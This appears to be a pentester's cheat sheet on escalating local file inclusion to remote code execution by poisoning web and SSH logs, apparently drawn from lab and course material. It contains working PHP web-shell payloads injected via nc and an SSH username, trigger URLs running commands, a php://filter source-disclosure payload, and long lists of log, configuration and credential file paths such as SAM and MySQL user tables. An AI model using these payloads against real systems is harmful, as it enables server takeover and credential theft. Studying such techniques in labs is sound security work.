https://vulndev.io/2022/09/17/sqli-lfi-to-rce-xamlx-impersonation-streamio-hackthebox/

##  Contaminating Log Files

[+] through the logs to the apache server

========================================================================
>   nc -nv 10.11.0.22 80
>   <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
HTTP/1.1 400 Bad Request
========================================================================

[+] Code executing using Apache server logs

>   http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/web/54eae3266115e296c113a89529a93801-webapp_lfi_04.png)


##	LFI

>	192.168.211.80/console/file.php?file=php://filter/convert.base64-encode/resource=/var/www/html/console/file.php


##  Log files to read

##	Read apache docs 

-	/etc/apache2/sites-enabled
-	/var/log/apache2/useragent.log
-	`/var/log/apache2/access.log`	[Important]	
-	/etc/apache2/apache2.conf
-	/var/log/apache2
-	/var/log/auth.Logs	[SSH-Logs]
-	/var/log/auth.log

>	 ssh '<?php system($_GET['c']); ?>'@192.168.171.80
>	http://192.168.171.80/console/file.php?file=/var/log/auth.log&c=whoami

'<?php system($_GET['c']); ?>'
##	FTP Logs locations
/var/log/vsftpd.log 
/etc/vsftpd.conf
/var/ftp/pub/php_reverse_shell.php



C:\xampp\apache\logs\access.log


/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log

/boot.ini
/WINDOWS/win.ini
/WINNT/win.ini
/WINDOWS/Repair/SAM
/WINDOWS/php.ini
/WINDOWS/system32/drivers/etc/hosts
/WINNT/php.ini
/php/php.ini
/php5/php.ini
/php4/php.ini
/apache/php/php.ini
/xampp/apache/bin/php.ini
/home2/bin/stable/apache/php.ini
/home/bin/stable/apache/php.ini
/Program Files/Apache Group/Apache/logs/access.log
/Program Files/Apache Group/Apache/logs/error.log
/Program Files/Apache Group/Apache/conf/httpd.conf
/Program Files/Apache Group/Apache2/conf/httpd.conf
/Program Files/xampp/apache/conf/httpd.conf
/Program Files/FileZilla Server/FileZilla Server.xml
/Program Files (x86)/Apache Group/Apache/logs/access.log
/Program Files (x86)/Apache Group/Apache/logs/error.log
/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
/Program Files (x86)/xampp/apache/conf/httpd.conf
/Program Files (x86)/FileZilla Server/FileZilla Server.xml
/AppServ/MySQL/data/mysql/user.MYD



##  Files to read

C:\xampp\php\php.ini



https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#lfi

